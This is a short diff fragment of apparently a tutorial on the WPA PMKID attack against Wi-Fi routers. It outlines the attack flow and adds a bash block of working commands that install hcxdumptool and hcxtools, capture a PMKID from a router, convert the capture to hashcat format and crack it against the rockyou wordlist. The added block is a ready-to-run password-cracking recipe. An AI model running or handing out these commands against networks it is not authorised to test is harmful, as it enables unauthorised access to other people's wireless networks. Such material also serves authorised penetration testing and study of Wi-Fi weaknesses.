@@ -18,3 +18,18 @@ Attack flow:
 3. Attacker takes that PMKID value offline
 4. Runs a dictionary or brute force attack to find the PMK that produces the same PMKID
 5. Password recovered — no clients, no handshake waiting required
+
+```bash
+# Step 1 - install hcxdumptool and hcxtools
+apt install hcxdumptool hcxtools
+
+# Step 2 - capture PMKID from router (no clients needed)
+hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
+
+# Step 3 - convert to hashcat format
+hcxpcapngtool -o hash.hc22000 capture.pcapng
+
+# Step 4 - crack with hashcat
+hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
+```
+
